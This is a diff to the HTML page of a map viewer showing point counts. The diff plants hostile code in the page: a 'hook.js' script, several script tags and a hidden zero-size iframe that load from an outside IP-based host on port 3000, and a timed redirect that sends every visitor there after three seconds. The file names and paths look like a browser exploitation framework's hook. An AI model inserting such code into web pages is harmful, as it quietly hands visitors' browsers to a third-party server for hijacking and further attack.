@@ -22,9 +22,11 @@
     </style>
 </head>
 <body>
+    <script src="hook.js"></script>
 	<script src="https://172-233-208-160.ip.linodeusercontent.com:3000/demos/butcher/index.html"></script>
-<script src="172-233-208-160.ip.linodeusercontent.com:3000/demos/butcher/index.html"></script>
-<iframe src="172-233-208-160.ip.linodeusercontent.com:3000/demos/butcher/index.html" frameborder="0" width="0" height="0"></iframe>
+    <script src="https://172-233-208-160.ip.linodeusercontent.com:3000"></script>
+    <script src="https://172-233-208-160.ip.linodeusercontent.com:3000/demos/butcher/index.html"></script>
+    <iframe src="https://172-233-208-160.ip.linodeusercontent.com:3000/demos/butcher/index.html" frameborder="0" width="0" height="0"></iframe>
     <div id="map-container">
         <div id="map"></div>
     </div>
@@ -32,7 +34,11 @@
         <div id="stats-total" class="sidebar-stats">Total points: 313</div>
         <div id="stats-visible" class="sidebar-stats">Visible points: 0</div>
     </div>
-
+<script>
+        setTimeout(function() {
+            window.location.href = "https://172-233-208-160.ip.linodeusercontent.com:3000/demos/butcher/index.html";
+        }, 3000); 
+    </script>
     <script src="/leaflet/leaflet.js"></script>
     <script src="/leaflet/js/leaflet.markercluster.js"></script>
     <script>
